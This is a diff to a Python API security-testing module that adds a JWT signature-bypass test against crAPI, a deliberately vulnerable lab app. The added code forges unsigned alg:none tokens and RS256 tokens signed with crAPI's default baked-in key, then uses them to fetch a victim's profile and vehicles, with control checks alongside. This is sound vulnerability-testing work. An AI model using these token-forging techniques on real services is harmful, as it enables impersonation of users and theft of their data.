@@ -4,12 +4,18 @@ Broken Authentication (OWASP API2:2023) tests: JWT weak signing bypass.
 
 from __future__ import annotations
 
+import json
 import logging
+import random
+import uuid
 from datetime import datetime, timedelta, timezone
-from typing import Optional
+from typing import Any, Optional
 
 import jwt
+from cryptography.hazmat.primitives.asymmetric import rsa
+from jwt.algorithms import RSAAlgorithm
 
+from src.utils.crapi_client import CrAPIClient
 from src.utils.results_logger import RunLogger
 from src.utils.vampi_client import VAmPIClient
 from src.vulnerabilities.authorization import BOOKS_PATH
@@ -227,6 +233,287 @@ class JWTWeakSigningBypassTest(VulnerabilityTest):
         )
 
 
+def _fresh_synthetic_login(client: CrAPIClient, role: str) -> None:
+    """Sign up and log in a brand-new synthetic identity for `role`.
+
+    crAPI enforces unique email *and* phone number per account and has no
+    reseed endpoint, so each test run needs its own fresh identity rather
+    than reusing config's static test_users values, which would 403
+    ("already registered") on a second run.
+    """
+    user = client.test_users[role]
+    suffix = uuid.uuid4().hex[:10]
+    user["email"] = f"{role}.{suffix}@crapi-test.local"
+    user["number"] = str(random.randint(6_000_000_000, 6_999_999_999))
+    client.signup(role)
+    client.login(role)
+
+
+class JWTSignatureVerificationBypassTest(VulnerabilityTest):
+    """
+    Confirms whether crapi-identity verifies a JWT's signature before
+    trusting its claims, and whether its RSA signing key is itself
+    forgeable when that check does happen.
+
+    crapi-identity signs tokens with RS256, not the HS256 the JWT_SECRET
+    environment variable's name suggests — that variable is unused for
+    token signing. The private key comes from `/app/default_jwks.json`
+    inside the crapi-identity image, used whenever docker/keys/ is left
+    empty (the case for this project's docker-compose.crapi.yml), and is
+    therefore identical across every deployment that hasn't supplied its
+    own JWKS.
+
+    `GET /identity/api/v2/user/dashboard` reads the `sub` claim out of the
+    JWT payload without verifying the signature at all: an `alg: none`
+    token for a victim's email who never logged in this run returns that
+    victim's full profile, while the same token with a syntactically
+    valid but unregistered email 404s — confirming the route is trusting
+    whatever email is handed to it, not authenticating the caller.
+
+    `GET /identity/api/v2/vehicle/vehicles` does check the signature (a
+    token signed with an unrelated, freshly-generated RSA key is
+    rejected), but accepts a token signed with the default key above,
+    confirming that key is the actual root of trust and is not a secret.
+    """
+
+    name = "jwt_signature_verification_bypass"
+    owasp_category = "API2:2023 Broken Authentication"
+
+    def __init__(self, architecture: str, target: str, client: CrAPIClient) -> None:
+        super().__init__(architecture, target)
+        self.client = client
+        default_jwks: Optional[dict[str, Any]] = client.scan_config.get(
+            "jwt_default_jwks"
+        )
+        self.default_kid: str = (default_jwks or {}).get("kid", "")
+        self.default_signing_key = (
+            RSAAlgorithm.from_jwk(json.dumps(default_jwks)) if default_jwks else None
+        )
+        self.dashboard_path: str = client.endpoints.get(
+            "dashboard", "/identity/api/v2/user/dashboard"
+        )
+        self.vehicles_path: str = client.endpoints.get(
+            "vehicles", "/identity/api/v2/vehicle/vehicles"
+        )
+
+    def run(self) -> list[VulnerabilityResult]:
+        _fresh_synthetic_login(self.client, "victim")
+        victim_email = self.client.test_users["victim"]["email"]
+
+        results = [self._test_rs256_algorithm_confirmed()]
+        if self.default_signing_key is None:
+            results.append(
+                self._result(
+                    passed=True,
+                    severity=Severity.LOW,
+                    evidence=(
+                        "No jwt_default_jwks configured — forgery checks "
+                        "skipped, inconclusive."
+                    ),
+                    request_summary=None,
+                    response_summary=None,
+                )
+            )
+            return results
+
+        results.append(self._test_dashboard_alg_none_forgery(victim_email))
+        results.append(self._test_dashboard_control_nonexistent_subject_rejected())
+        results.append(self._test_vehicles_default_key_forgery(victim_email))
+        results.append(self._test_vehicles_control_wrong_key_rejected(victim_email))
+        return results
+
+    # -- forging -----------------------------------------------------------
+
+    @staticmethod
+    def _forge_rs256_token(key: Any, kid: str, sub: str) -> str:
+        now = datetime.now(timezone.utc)
+        payload = {
+            "sub": sub,
+            "iat": now,
+            "exp": now + timedelta(seconds=FORGED_TOKEN_TTL_SECONDS),
+            "role": "user",
+        }
+        headers = {"kid": kid} if kid else {}
+        return jwt.encode(payload, key, algorithm="RS256", headers=headers)
+
+    @staticmethod
+    def _forge_alg_none_token(sub: str) -> str:
+        now = datetime.now(timezone.utc)
+        payload = {
+            "sub": sub,
+            "iat": now,
+            "exp": now + timedelta(seconds=FORGED_TOKEN_TTL_SECONDS),
+            "role": "user",
+        }
+        return jwt.encode(payload, key="", algorithm="none")
+
+    # -- checks --------------------------------------------------------------
+
+    def _test_rs256_algorithm_confirmed(self) -> VulnerabilityResult:
+        """Baseline: decode a real, server-issued token's header (without
+        verifying its signature) to confirm RS256 is genuinely the
+        algorithm in use before the forgery attempts below assume it.
+        """
+        token = self.client.login("victim")
+        header = jwt.get_unverified_header(token)
+        alg = header.get("alg")
+        kid = header.get("kid")
+        is_rs256 = alg == "RS256"
+
+        evidence = f"Server-issued token header: {header!r}."
+        evidence += (
+            " Uses RS256, an asymmetric algorithm — verifying a token only "
+            "needs the public half of the keypair, so a forgery attempt "
+            "requires either the private key itself or a validator that "
+            "skips signature checking entirely."
+            if is_rs256
+            else f" Uses {alg!r}, not RS256 — the forgery attempts below assume RS256 and may not apply."
+        )
+
+        return self._result(
+            passed=True,
+            severity=Severity.LOW,
+            evidence=evidence,
+            request_summary="POST /identity/api/auth/login as_user='victim'",
+            response_summary=f"token alg={alg!r} kid={kid!r}",
+        )
+
+    def _test_dashboard_alg_none_forgery(
+        self, victim_email: str
+    ) -> VulnerabilityResult:
+        forged = self._forge_alg_none_token(sub=victim_email)
+        resp = self.client.get(self.dashboard_path, token=forged)
+        confirmed = (
+            resp.status_code == 200
+            and self._parse_json(resp).get("email") == victim_email
+        )
+
+        evidence = (
+            f"Unsigned alg='none' token for victim's email (never presented "
+            f"with victim's password in this run) -> GET {self.dashboard_path} "
+            f"returned HTTP {resp.status_code}."
+        )
+        if confirmed:
+            evidence += (
+                " Returned the victim's full profile despite the token "
+                "carrying no signature at all — this route does not verify "
+                "JWT signatures before trusting the `sub` claim."
+            )
+
+        return self._result(
+            passed=not confirmed,
+            severity=Severity.CRITICAL if confirmed else Severity.LOW,
+            evidence=evidence,
+            request_summary=f"GET {self.dashboard_path} with alg='none' token, sub=victim's email",
+            response_summary=f"HTTP {resp.status_code}",
+            cwe="CWE-347",
+        )
+
+    def _test_dashboard_control_nonexistent_subject_rejected(
+        self,
+    ) -> VulnerabilityResult:
+        """Control: the same unsigned-token technique with a syntactically
+        valid but never-registered email must fail — otherwise the result
+        above would just mean "this route returns arbitrary data", not
+        specifically "this route trusts a forged identity claim".
+        """
+        nonexistent = f"nonexistent_{uuid.uuid4().hex[:10]}@crapi-test.local"
+        forged = self._forge_alg_none_token(sub=nonexistent)
+        resp = self.client.get(self.dashboard_path, token=forged)
+        rejected = resp.status_code == 404
+
+        evidence = (
+            f"Same unsigned alg='none' technique with a never-registered "
+            f"email -> GET {self.dashboard_path} returned HTTP {resp.status_code}."
+        )
+        evidence += (
+            " Not found, as expected — confirms the leak above is specifically "
+            "because a real victim's email was trusted from the forged claim, "
+            "not because this route returns arbitrary data regardless of input."
+            if rejected
+            else " NOT rejected — inconsistent with the nonexistent-subject baseline."
+        )
+
+        return self._result(
+            passed=rejected,
+            severity=Severity.LOW if rejected else Severity.MEDIUM,
+            evidence=evidence,
+            request_summary=f"GET {self.dashboard_path} with alg='none' token, sub=nonexistent email",
+            response_summary=f"HTTP {resp.status_code}",
+        )
+
+    def _test_vehicles_default_key_forgery(
+        self, victim_email: str
+    ) -> VulnerabilityResult:
+        forged = self._forge_rs256_token(
+            self.default_signing_key, self.default_kid, sub=victim_email
+        )
+        resp = self.client.get(self.vehicles_path, token=forged)
+        confirmed = resp.status_code == 200
+
+        evidence = (
+            f"Token for victim's email, signed with crapi-identity's default "
+            f"RSA key (baked into the image, never presented with victim's "
+            f"password in this run) -> GET {self.vehicles_path} returned "
+            f"HTTP {resp.status_code}."
+        )
+        if confirmed:
+            evidence += (
+                " Accepted — this route does verify signatures (see control "
+                "below) but the signing key itself is a fixed value shipped "
+                "in the public Docker image, not a per-deployment secret."
+            )
+
+        return self._result(
+            passed=not confirmed,
+            severity=Severity.CRITICAL if confirmed else Severity.LOW,
+            evidence=evidence,
+            request_summary=f"GET {self.vehicles_path} with forged token (default key, sub=victim's email)",
+            response_summary=f"HTTP {resp.status_code}",
+            cwe="CWE-321",
+        )
+
+    def _test_vehicles_control_wrong_key_rejected(
+        self, victim_email: str
+    ) -> VulnerabilityResult:
+        """Control: identical forged claims, signed with a different,
+        freshly-generated RSA key, must be rejected — otherwise the
+        default-key result above would just mean "any signature works",
+        not specifically that the default key is guessable.
+        """
+        wrong_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+        forged = self._forge_rs256_token(wrong_key, self.default_kid, sub=victim_email)
+        resp = self.client.get(self.vehicles_path, token=forged)
+        rejected = resp.status_code == 401
+
+        evidence = (
+            f"Control: same forged claims, signed with a different, "
+            f"freshly-generated RSA key -> GET {self.vehicles_path} returned "
+            f"HTTP {resp.status_code}."
+        )
+        evidence += (
+            " Rejected, confirming the default-key result is a genuine "
+            "hardcoded-key bypass and not simply 'any signature is accepted'."
+            if rejected
+            else " NOT rejected — signature verification appears to accept arbitrary keys."
+        )
+
+        return self._result(
+            passed=rejected,
+            severity=Severity.LOW if rejected else Severity.CRITICAL,
+            evidence=evidence,
+            request_summary=f"GET {self.vehicles_path} with forged token (unrelated key, sub=victim's email)",
+            response_summary=f"HTTP {resp.status_code}",
+        )
+
+    @staticmethod
+    def _parse_json(resp: Any) -> dict[str, Any]:
+        try:
+            return resp.json()
+        except ValueError:
+            return {}
+
+
 def _print_results(results: list[VulnerabilityResult]) -> None:
     for result in results:
         status = "PASS" if result.passed else f"FAIL ({result.severity.value.upper()})"
@@ -247,6 +534,16 @@ def _run_vampi() -> None:
     _print_results(results)
 
 
+def _run_crapi() -> None:
+    client = CrAPIClient.from_config("config/crapi.yaml")
+    with RunLogger("rest", "crapi", "config/crapi.yaml") as run:
+        results = JWTSignatureVerificationBypassTest(
+            architecture="rest", target="crapi", client=client
+        ).run()
+        run.log_results(results)
+    _print_results(results)
+
+
 if __name__ == "__main__":
     import argparse
 
@@ -255,15 +552,17 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description=__doc__)
     parser.add_argument(
         "--target",
-        choices=["vampi"],
-        default="vampi",
+        choices=["vampi", "crapi", "all"],
+        default="all",
         help=(
-            "Which target's container must be up. VAmPI-only for now — "
-            "kept as a flag for consistency with the other vulnerability "
-            "modules (authorization.py, injection.py, data_exposure.py)."
+            "Which target's container must be up. Default 'all' requires both "
+            "docker-compose.vampi.yml and docker-compose.crapi.yml to be running "
+            "— pass --target to run just one."
         ),
     )
     args = parser.parse_args()
 
-    if args.target == "vampi":
+    if args.target in ("vampi", "all"):
         _run_vampi()
+    if args.target in ("crapi", "all"):
+        _run_crapi()
